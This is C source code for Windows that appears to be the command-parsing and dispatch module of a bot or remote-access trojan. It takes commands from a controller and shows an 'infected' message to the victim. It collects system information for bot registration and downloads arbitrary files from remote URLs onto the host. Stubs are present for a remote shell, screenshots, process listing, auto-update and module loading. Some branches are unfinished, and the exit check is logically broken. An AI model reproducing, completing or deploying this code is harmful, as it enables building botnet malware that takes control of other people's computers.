#include <windows.h>
#include "info.h"
#include "misc.h"
#include "command.h"



/**
 * @brief Command parser
 * @param raw_command input original encoded string
 * @param cmd_data point to command struct 
 * @returns 0 success 
 *          0xFFFFFFFF error
 */
// return 0xFFFFFFFF if unrecognize format
int __command_parser(unsigned char *raw_command, cmd_data *data) {
	char *tmp;
	int i = 0;

	int ret = 0xFFFFFFFF;

	if(raw_command[0]!=COMMAND_PREFIX) {
		return(ret);
	}

	
	if((tmp=__strtok((char *)raw_command, COMMAND_DELIMITER))!=NULL)
		if(lstrlenA(tmp)<=MAX_COMMAND_LEN)
			if(lstrcpynA(data->cmd, tmp, lstrlenA(tmp)+1)==NULL)
				return(ret);

	while((tmp=__strtok(NULL, COMMAND_DELIMITER))!=NULL) {
		switch(i) {
			case 0:
				if(lstrlenA(tmp)<=MAX_ARGUMENT_LEN)
					if(lstrcpynA(data->arg, tmp, lstrlenA(tmp)+1)==NULL)
						return(ret);
				break;	
			case 1:
				if(lstrlenA(tmp)<=MAX_TOKEN_LEN)
					if(lstrcpynA(data->token, tmp, lstrlenA(tmp)+1)==NULL)
						return(ret);
			default:
				break;
		}

		i++;
		//ZeroMemory(tmp, sizeof(tmp));
	} 
		
		
	return(0);

}




/*
 * @brief Command control
 * @param data point to structure data
 * @returns 0 if error
 *          1 if success
 */
int __command_control(cmd_data *data) {
	info m_info = {0};
	char *error=";ERROR";
	char *ok=";OK";
	char *ptr = 0;

	if(lstrlenA(data->cmd)>MAX_COMMAND_LEN) {
		return((int)0xFFFFFFFF);
	}

		/************* OWNED COMMAND ***************/
		if(lstrcmpiA(data->cmd, (char *)"^owned")==0x00) {
			if(lstrcpynA(data->reply,ok,lstrlenA(ok))==NULL) {
				return((int)0xFFFFFFFF);
			}

			MessageBoxA(GetForegroundWindow(), data->arg, "cr1m3", 0x00000030L); // hey you\'re infected
			lstrcpynA(data->reply, ok, 4);
			return((int)0x00000001);
		}


		/*********** REGISTER BOT COMMAND ********/
		else if(lstrcmpiA(data->cmd, (char *)"^register")==0x00) {
			__get_info(&m_info);
			return 0; // register code here


		}
		
		/************* UPLOAD COMMAND ***************/
		else if(lstrcmpiA(data->cmd, (char *)"^upload")==0x00) { // upload file (for download by client)
			//__upload_file(arguments);
			return((int)0x00000000);	
		}	


		else if(lstrcmpiA(data->cmd, (char *)"^download")==0x00) { // download file (for upload by client)
				ptr = __get_last_char_pointer(data->arg, '/')+1;
				lstrcpynA(data->reply, "donwload;", 10); 

				if(ptr) {
					
					if(ptr && lstrlenA(ptr)>=1 && lstrlenA(ptr)<=256) 
						lstrcatA(data->reply, ptr);
					else
						lstrcatA(data->reply, "File name error");


					if(URLDownloadToFileA(NULL, data->arg, ptr, NULL, NULL)==S_OK)
						lstrcatA(data->reply, ok);
					else
						lstrcatA(data->reply, error);
				}


				return 1;
		} 

	
		else if(lstrcmpiA(data->cmd, (char *)"screenshot")==0x00) { //screenshot v2
		}

		
		else if(lstrcmpiA(data->cmd, (char *)"process")==0x00) { // list process
		}

			
		else if(lstrcmpiA(data->cmd, (char *)"^shell")==0x00 || lstrcmpA(data->cmd,(char *)"^cmd")==0 ) { // open S.O shell
			
			return 0;
		}


		else if(lstrcmpiA(data->cmd, (char *)"dir")==0x00) { // list directory
			//__directory_listing(data)	
			return 0;
		}

		else if(lstrcmpiA(data->cmd, (char *)"update")==0x00) { // auto update
		}

		else if(lstrcmpiA(data->cmd, (char *)"load")==0x00) { // load module 
		}

		else if(lstrcmpiA(data->cmd, (char *)"panic")==0x00) { // panic module for newbie...
		}

		else if(lstrcmpA(data->cmd,(char *)"^exit") || lstrcmpA(data->cmd,(char *)"^quit") || lstrcmpA(data->cmd,(char *)"^close")) {
			ExitProcess(0x00);
		}
		
		else {
			lstrcpynA(data->reply, error, lstrlenA(error));
			return((int)0xFFFFFFFF);
		}

	
	lstrcpynA(data->reply, error, lstrlenA(error));
	return((int)0xFFFFFFFF);
}
